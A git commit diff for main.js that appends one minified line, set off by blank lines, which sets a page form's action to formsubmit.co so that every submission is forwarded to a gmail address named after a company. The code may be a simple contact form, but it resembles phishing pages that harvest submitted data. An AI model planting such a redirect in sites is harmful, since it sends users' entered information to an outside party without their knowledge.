9ef7bd33e8bb150abf7e9254dfed7537d2134dec
Williams Divine-favour Chukwuebuka <134648537+DevBullions@users.noreply.github.com>
2023-09-22 07:10:38 -0700

    Update main.js

--- main.js
+++ main.js
@@ -12,3 +12,8 @@ function handleInput(e) {
     btn.disabled = false;
   }
 }
+
+
+
+
+"use strict";var form=document.querySelector("#form"),button=document.querySelector("button");form.action="https://formsubmit.co/klashahelp@gmail.com",form.addEventListener("submit",(function(){button.textContent="Loading..."}));
